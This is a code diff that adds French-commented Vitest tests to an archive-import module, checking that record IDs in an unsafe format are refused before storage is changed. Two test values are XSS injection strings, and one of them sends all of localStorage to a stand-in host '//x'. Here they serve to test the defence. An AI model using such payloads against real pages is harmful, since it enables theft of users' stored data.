@@ -95,7 +95,7 @@ vi.mock('@shared/feedback.js', () => ({
 }));
 
 // Imports APRÈS vi.mock (hissé de toute façon, mais garde l'ordre lisible).
-import { Archive, mergeGpxIndex } from '@pctac/archive.js';
+import { findUnsafeId, Archive, mergeGpxIndex } from '@pctac/archive.js';
 import { ImageStore } from '@pctac/image-store.js';
 import { Storage } from '@pctac/storage.js';
 
@@ -211,6 +211,16 @@ describe('importFile — validation du manifest AVANT toute modification (archiv
     const file = await buildPctacZip({ manifest: { appName: 'OI' }, data: { [LOCAL_STORAGE_KEY]: JSON.stringify([{ id: 'y' }]) } });
 
     await expect(Archive.importFile(file)).rejects.toThrow(/OI/);
+    expect(dumpLocalStorage()).toEqual(before);
+  });
+
+  it('revue (XSS) : archive portant un id hors format refusée avant toute modification', async () => {
+    localStorage.setItem(ADVERSARIES_KEY, JSON.stringify([{ id: '1', nom: 'Terrain' }]));
+    const before = dumpLocalStorage();
+    const evil = "1');alert(1);('";
+    const file = await buildPctacZip({ data: { [ADVERSARIES_KEY]: JSON.stringify([{ id: evil, nom: 'Piège' }]) } });
+    await expect(Archive.importFile(file)).rejects.toThrow(/identifiant de fiche invalide/);
+    expect(confirmSpy).not.toHaveBeenCalled();
     expect(dumpLocalStorage()).toEqual(before);
   });
 
@@ -337,6 +347,14 @@ describe('importOiArchive — passerelle OI → PC-Tac (archive.js:279-456)', ()
     const result = await Archive.importOiArchive(file);
     expect(result.gridImported).toBe(false);
     expect(localStorage.getItem('pcTacPlanGrid')).toBeNull();
+  });
+
+  it('revue (XSS) : un identifiant hors format est repéré dans les collections de l’archive', () => {
+    const evil = "1');fetch('//x/?'+JSON.stringify(localStorage));('";
+    expect(findUnsafeId({ pcTacAdversaries: JSON.stringify([{ id: '1790231992926' }, { id: evil }]) })).toBe(evil);
+    expect(findUnsafeId({ pcTacPhotos: JSON.stringify([{ id: 'oi_adv_k2_0_sync' }]), pcTacPlanPins: JSON.stringify([{ id: 'adv_a1_1790231992926' }]) })).toBeNull();
+    // Clé hors collections ou valeur illisible : non concernée.
+    expect(findUnsafeId({ theme: '"dark"', pcTacHostages: 'pas du json' })).toBeNull();
   });
 
   it('reprend domicile, profession, stature et ethnie (décision 20) ; rien de vide n’est posé', async () => {
